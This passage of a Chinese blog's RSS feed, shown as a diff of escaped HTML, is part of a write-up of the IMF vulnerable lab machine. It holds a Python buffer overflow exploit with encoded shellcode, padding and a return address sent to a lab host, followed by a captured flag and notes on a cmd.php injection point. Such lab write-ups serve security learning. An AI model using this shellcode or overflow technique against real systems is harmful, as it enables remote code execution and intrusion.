+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;192.168.100.142&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7788&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;48093572&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xba\x74\x40\x7e\xaf\xda\xd6\xd9\x74\x24\xf4\x58\x29&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xc9\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x24\x4e\x9c&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5a\xf5\x95\x97\x46\xa6\x6a\x0b\xe3\x4a\xe4\x4a\x43&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2c\x3b\x0c\x37\xe9\x73\x32\xf5\x89\x3d\x34\xfc\xe1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7d\x6e\x9a\x94\x15\x6d\x63\x74\x4b\xf8\x82\xc8\xf5&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xab\x15\x7b\x49\x48\x1f\x9a\x60\xcf\x4d\x34\x15\xff&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x02\xac\x81\xd0\xcb\x4e\x3b\xa6\xf7\xdc\xe8\x31\x16&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x50\x05\x8f\x59&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;168&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x63\x85\x04\x08\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;监听本地~&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519133457646.png&#34;
+	width=&#34;746&#34;
+	height=&#34;189&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519133457646_hud8214105bd138c3327689d74ba9d3659_99121_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519133457646_hud8214105bd138c3327689d74ba9d3659_99121_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519133457646&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;394&#34;
+		data-flex-basis=&#34;947px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Flag6{R2gwc3RQcm90MGMwbHM=}&lt;/p&gt;
+&lt;p&gt;后续登录之后，php文件分析查看&lt;/p&gt;
+&lt;p&gt;upload/index.php&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145040561.png&#34;
+	width=&#34;892&#34;
+	height=&#34;766&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145040561_hufa85982973ed07e101868dc1e167e7ec_152244_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145040561_hufa85982973ed07e101868dc1e167e7ec_152244_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519145040561&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;116&#34;
+		data-flex-basis=&#34;279px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;upload/cmd.php 注入点&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145238147.png&#34;
+	width=&#34;773&#34;
+	height=&#34;670&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145238147_hud00bd2b8bc292adddcd2450c56996fbb_116109_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145238147_hud00bd2b8bc292adddcd2450c56996fbb_116109_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519145238147&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;115&#34;
+		data-flex-basis=&#34;276px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
